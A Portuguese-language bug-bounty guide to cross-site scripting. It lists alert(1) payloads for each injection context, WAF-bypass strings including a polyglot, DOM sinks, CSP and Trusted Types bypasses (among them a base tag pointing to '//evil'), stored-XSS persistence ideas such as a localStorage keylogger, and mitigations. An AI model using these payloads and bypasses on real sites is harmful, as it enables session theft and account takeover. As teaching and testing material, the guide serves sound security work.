# XSS Deep Dive

> XSS continua sendo uma das classes mais exploradas em bug bounties. Este guia foca em contextos modernos, bypasses de WAF, Trusted Types e DOM clobbering.

---

## 1. Tipos de XSS

| Tipo | O que e | Onde acontece |
|------|---------|----------------|
| **Reflected** | Payload entra no request e volta na response sem persistir. | Search, error messages, deep-links. |
| **Stored** | Payload e persistido (DB, cache) e renderizado para outros usuarios. | Comments, profile, chat. |
| **DOM-based** | Vulnerabilidade no JS do cliente (sink em `innerHTML`, `eval`, `document.write`). | SPA modernas. |
| **Universal (uXSS)** | Bug no browser/extensao que permite XSS cross-origin. | Browser exploits. |
| **Self-XSS + clickjacking** | Vitima cola payload no console - combinado com social eng. | Plays sociais. |

---

## 2. Contextos de injection

Cada contexto exige um payload diferente:

### HTML body
```html
<div>USER_INPUT</div>
```
Payload: `<svg onload=alert(1)>` ou `<img src=x onerror=alert(1)>`.

### Atributo HTML
```html
<input value="USER_INPUT">
```
Payload: `" autofocus onfocus=alert(1) x="`.

### Dentro de `<script>`
```html
<script>let user = "USER_INPUT";</script>
```
Payload: `";alert(1);//`.

### Dentro de `href`/`src` JS URI
```html
<a href="USER_INPUT">click</a>
```
Payload: `javascript:alert(1)`.

### JSON via JS
```html
<script>var data = USER_INPUT;</script>
```
Payload: `1;alert(1)//`.

### CSS context
```html
<style>body { background: USER_INPUT; }</style>
```
Payload: `red;}body{background-image:url(javascript:alert(1))} /*` (legacy IE only - documentar mas raramente explora).

---

## 3. Bypasses de filtros/WAF comuns

```html
<!-- Mudanca de caso (filtro case-sensitive) -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Tags com whitespace bizarro -->
<svg/onload=alert(1)>
<svg<svg>onload=alert(1)>

<!-- Encoding -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
%3Cscript%3Ealert(1)%3C/script%3E
<script>alert(1)</script>

<!-- DOM events nao listados na blocklist -->
<details/open/ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- Quebra de paragrafo + iframe srcdoc -->
<iframe srcdoc="<script>alert(1)</script>"></iframe>

<!-- DataURI -->
<object data="data:text/html,<script>alert(1)</script>">

<!-- Polyglot (funciona em multiplos contextos) -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
```

---

## 4. DOM XSS - encontrar sinks

Sinks comuns em JS:
- `element.innerHTML = userInput`
- `eval(userInput)`
- `setTimeout(userInput, 100)`
- `document.write(userInput)`
- `location = userInput`
- `Function(userInput)`

Sources comuns:
- `location.hash` / `location.search`
- `document.referrer`
- `window.name`
- `postMessage` event data
- Local/Session storage

Ferramenta: **DOM Invader** (Burp Pro). Para CLI, use `dom-xss-scanner` ou `domgo.at` (lab).

```javascript
// Exemplo classico: sink no innerHTML
const id = new URLSearchParams(location.search).get("id");
document.querySelector("#userBio").innerHTML = `Bio do user ${id}`;
// URL: /profile?id=<img src=x onerror=alert(1)>
```

---

## 5. Trusted Types (defesa moderna)

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types default
```

Quando ativado, `innerHTML = string` lanca `TypeError`. Bypasses pesquisam:
- Policies fracas (`createHTML` retornando input direto).
- Sinks que nao sao cobertos por Trusted Types (`Function()`).
- Bugs no proprio browser (raro).

---

## 6. CSP bypass cookbook

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.alvo.com
```

Bypasses:
- **JSONP endpoints** em CDN whitelisted (`?callback=alert`).
- **Angular/Vue gadgets** se `script-src` inclui CDN onde esses frameworks vivem.
- **`'unsafe-inline'`** + missing `'strict-dynamic'`.
- **base-uri** ausente -> injetar `<base href="//evil">`.

Use [`csp-evaluator`](https://csp-evaluator.withgoogle.com/) e [`csp-bypass.com`](https://csp-bypass.com/) para mapear.

---

## 7. Persistencia em XSS stored

Apos achar stored XSS, considere:
- Service worker registration (persiste em background).
- IndexedDB poisoning.
- `localStorage` para keylogger.
- BeEF para sessao persistente.

---

## 8. Impacto - como contar a historia

Em um relatorio bom:

```text
- Roubo de tokens (cookies/localStorage).
- Atacar admin (CSRF + XSS = account takeover de privilegiado).
- Keylogger no painel de pagamento.
- SSRF via JS (se a vitima e admin com acesso interno).
- Defacement / impact reputacional.
- Acesso a APIs internas via fetch() com mesma origem.
```

---

## 9. Mitigacao

1. **Escape contextual** (não apenas HTML-encode).
2. **CSP** com nonce + `'strict-dynamic'`, sem `unsafe-inline`.
3. **Trusted Types** quando possivel.
4. **HttpOnly + SameSite** para cookies de sessao.
5. **Sanitize input** com bibliotecas (DOMPurify, OWASP Java Encoder).
6. **Output encoding** automatico (frameworks modernos ja fazem - mas cuidado com `dangerouslySetInnerHTML`).

---

## Referencias

- [PortSwigger XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Trusted Types spec](https://w3c.github.io/trusted-types/)
